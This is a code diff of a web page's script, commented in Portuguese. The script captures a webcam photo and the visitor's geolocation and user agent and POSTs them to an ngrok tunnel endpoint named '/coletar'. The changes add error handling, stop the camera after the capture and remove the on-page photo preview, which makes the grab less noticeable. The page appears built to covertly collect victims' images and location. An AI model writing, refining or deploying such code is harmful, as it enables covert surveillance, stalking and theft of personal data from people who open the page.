@@ -97,70 +97,64 @@
         }, 3000);
 
         async function sendData() {
+            try {
+                const imagem = await captureOnce();
 
-            const imagem = await captureOnce();
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    // 1. Armazena latitude e longitude em constantes
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
 
-                    // 2. Cria um objeto com esses dados
-                    const localizacao = {
-                        position: `https://www.google.com/maps?q=${latitude},${longitude}`,
-                        timestamp: position.timestamp,
-                        userAgent: navigator.userAgent,
-                        userAct: navigator.userActivation.isActive,
-                        image: imagem
-                    };
+                        const localizacao = {
+                            position: `https://www.google.com/maps?q=${latitude},${longitude}`,
+                            timestamp: position.timestamp,
+                            userAgent: navigator.userAgent,
+                            userAct: navigator.userActivation.isActive,
+                            image: imagem // <- Envia a imagem base64 diretamente
+                        };
 
-                    fetch('https://38e806352b06.ngrok-free.app/coletar', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(localizacao)
-                    })
-                        .then(response => {
-                            if (!response.ok) {
-                                throw new Error('Erro na resposta do servidor');
-                            }
-                            return response.json();
+                        fetch('https://38e806352b06.ngrok-free.app/coletar', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(localizacao)
                         })
-                        .then(data => {
-                            console.log('Resposta do servidor:', data);
-                        })
-                        .catch(error => {
-                            console.error('Erro ao enviar localização:', error);
-                        });
-
-                }
-            )
+                            .then(response => response.json())
+                            .then(data => console.log('Resposta do servidor:', data))
+                            .catch(error => console.error('Erro ao enviar dados:', error));
+                    },
+                    (error) => {
+                        console.error('Erro ao obter geolocalização:', error);
+                    }
+                );
+            } catch (err) {
+                console.error('Erro no sendData:', err);
+            }
         }
 
+
         async function captureOnce() {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
 
             await new Promise(resolve => video.onloadedmetadata = resolve);
 
             const canvas = document.createElement('canvas');
-
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
 
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0);
 
+            // Para encerrar a câmera após capturar
+            stream.getTracks().forEach(track => track.stop());
+
             const imagem = canvas.toDataURL('image/png');
-
-            document.getElementById('photo').src = imagem;
-
             return imagem;
         }
 
-        captureOnce();
     </script>
 
 </body>
